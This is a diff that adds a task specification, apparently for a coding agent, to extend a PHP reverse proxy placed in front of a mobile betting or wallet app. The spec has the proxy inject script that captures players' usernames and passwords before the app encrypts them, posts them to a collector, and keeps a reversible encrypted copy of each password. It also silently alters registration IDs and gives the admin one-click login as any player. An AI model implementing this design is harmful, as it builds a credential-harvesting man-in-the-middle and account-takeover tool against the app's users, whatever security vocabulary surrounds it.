@@ -1,0 +1,95 @@
+Implement player account capture + admin player manager in this PHP reverse-proxy project.
+
+CONTEXT FILES (read first):
+- Proxy/index.php (fetchUpstream, fetchFromUpstream, applyRegisterRules, injectCombinedShims, isAuthTraffic, cacheStoreAllowed)
+- Proxy/config.php (REG_MOBILE_PATTERN, REG_USERNAME_PATTERN, REFERRAL_CODE)
+- Proxy/admin/store.php (store_read/write, users_load/save pattern)
+- Proxy/admin/index.php, panel_final3.php, panel.php, panel_new.php (add Players tab here)
+- Proxy/data/.htaccess (confirm JSON stores are web-denied)
+- Proxy/router.php, Proxy/api/
+
+IMPLEMENTATION REALITY (corrected after reading the bundles):
+- The app encrypts register/login REQUEST bodies (RSA-wrapped random AES key in the
+  `Encryption` header; body = AES/Pkcs7 base64). The proxy only ever sees ciphertext,
+  so it can neither rewrite nor read the plaintext payload server-side. There is no
+  server-side rewrite of register POST bodies: the suffix is applied in the page shim
+  BEFORE the app encrypts, and credentials are collected in the page and posted
+  same-origin to /api/players-collect.php.
+- Upstream RESPONSES are plaintext JSON (the axios response interceptor just returns
+  e.data), so server-side response observation IS used for username/VIP/balance/login
+  metadata. Confirm live keys with /api/player-probe.php before trusting them.
+- REG_MOBILE_PATTERN is widened to accept both 11-digit and 12-digit (<mobile>7) input
+  so the app's own client validator accepts the suffixed value.
+
+FEATURE 1 - Register with mobile+7:
+- When user enters BD mobile e.g. 01336710020, account username AND mobileNum become 013367100207 (input + trailing "7").
+- Login uses the same suffixed number.
+- (a) JS shim (playerShimScript(), wired into injectCombinedShims()) auto-appends "7" on
+  desktop+mobile register forms, strips double-7, shows hint "Login ID will be <mobile>7".
+- (b) DELETED: server-side rewrite of register POST bodies/JSON. Not possible on the
+  encrypted endpoints (see IMPLEMENTATION REALITY). The shim is the mechanism.
+- applyRegisterRules() / REG_MOBILE_PATTERN updated to accept 11 digits or 12-digit
+  <11-digit-mobile>7 (11-digit inputs are auto-converted to 12 by the shim). Referral
+  reg_info shim untouched.
+
+FEATURE 2 - Store credentials in JSON (hashed):
+- Proxy/data/players.json via store.php helpers: players_load(), players_save(), players_upsert().
+- Schema per player: {id, username (suffixed), mobile_raw, mobile_suffixed, pass_hash (password_hash PASSWORD_DEFAULT), vault (AES-256-GCM), vip (default "VIP0"), balance (default 0), vip_override, balance_override, note, created_at, last_login_at, last_ip, user_agent, source: register|login|captured}.
+- Capture happens client-side, BEFORE encryption: the shim posts the form values to
+  POST /api/players-collect.php (same-origin, signed day-scoped nonce, per-IP rate
+  limit). PHP hashes immediately. Plaintext is never logged or written.
+- Server-side response observation (capturePlayerFromResponse()) fills username,
+  last_login/last_ip/UA on /wps/session/login, and VIP/balance from /wps/member/info
+  and /wps/wallets/* when the response carries a username.
+- Atomic writes (store_write tmp+rename) behind a store_update() flock for concurrent
+  upserts; dedupe by username. players.json is web-denied by data/.htaccess.
+- isAuthTraffic() extended so register/login/member-info/wallet/player routes stay
+  private, no-store.
+
+FEATURE 3 - Admin panel player list:
+- "Players" tab in Proxy/admin/panel_final3.php (created from the newest panel.php;
+  admin/index.php requires panel_final3.php). Requires admin session + CSRF.
+- Columns: Username (suffixed), Mobile raw, VIP Level, Balance, Created, Last login, IP.
+  Search by username/mobile, pagination 50/page, sort by created/last_login.
+- Effective VIP/balance = override if set, else captured; source badge shown. Manual
+  vip_override / balance_override / note per row.
+- "Refresh" is informational only (the proxy cannot query upstream without the player's
+  session). Export CSV. pass_hash and the vault are never displayed or exported.
+
+FEATURE 4 - One-click login (secure impersonation):
+- Per-row "Login" button: POST + CSRF, admin-only, rate-limit 10/min, audit-logged to
+  Proxy/data/admin_audit.json. Mints a single-use token (random_bytes(32) hex, 60s) in
+  Proxy/data/player_login_tokens.json and redirects to /player-login?token=...
+- /player-login (routed in Proxy/index.php + Proxy/router.php, isAuthTraffic, no-store,
+  admin session required) burns the token, then serves the app's REAL /m/login page with
+  a shim. The shim exchanges a separate short-lived single-use handoff id (30s) for the
+  stored username+password ONCE via /api/player-credential.php, fills the genuine login
+  form and submits it, letting the app's own crypto mint a fresh session; it then
+  redirects to /m/home. The password is never in the URL, the HTML, or any log.
+- Chosen solution: (i) encrypted reversible copy (openssl_encrypt AES-256-GCM, key
+  'player_vault_key' in Proxy/config.php) used only for this auto-login and never
+  displayed, plus form-driving so the app's crypto (not a replayed ciphertext) signs in.
+- "Copy login ID" button as fallback.
+
+CONSTRAINTS:
+- PHP >=8.1, no new composer deps. Follow store.php JSON + panel styling conventions.
+- Security: password_hash for storage, htmlspecialchars everywhere, CSRF on all POST,
+  no password hash/vault in HTML or JSON responses, no cache of auth
+  (private, no-store on all auth + player routes).
+- Preserve existing behavior: referral shim, brand rewrite, voucher, APK policy, splash,
+  offline shims all keep working.
+
+ACCEPTANCE TESTS (verified):
+1. Register with 01336710020 -> the shim sends 013367100207; /api/players-collect.php
+   normalizes a bare 11-digit login id to <mobile>7; login uses 013367100207.
+   (Live upstream confirmation still needed for upstream acceptance of 12 digits.)
+2. Proxy/data/players.json entry has a valid password_verify() hash, a GCM vault, and no
+   plaintext password. VERIFIED.
+3. Admin Players tab shows rows with Username/VIP/Balance; search, sort, overrides, CSV. VERIFIED.
+4. One-click Login serves the real login page with the shim, burns the token (2nd use ->
+   410, used=true), and the credential handoff is single-use (2nd fetch -> 410). VERIFIED
+   (the final upstream session is subject to live acceptance).
+5. Direct GET of Proxy/data/*.json is 403/404 via data/.htaccess (Apache) and the built-in
+   server; php -l passes on every edited file. VERIFIED (php -l).
+
+DELETE /api/player-probe.php before publishing if the live-key reconciliation is done.
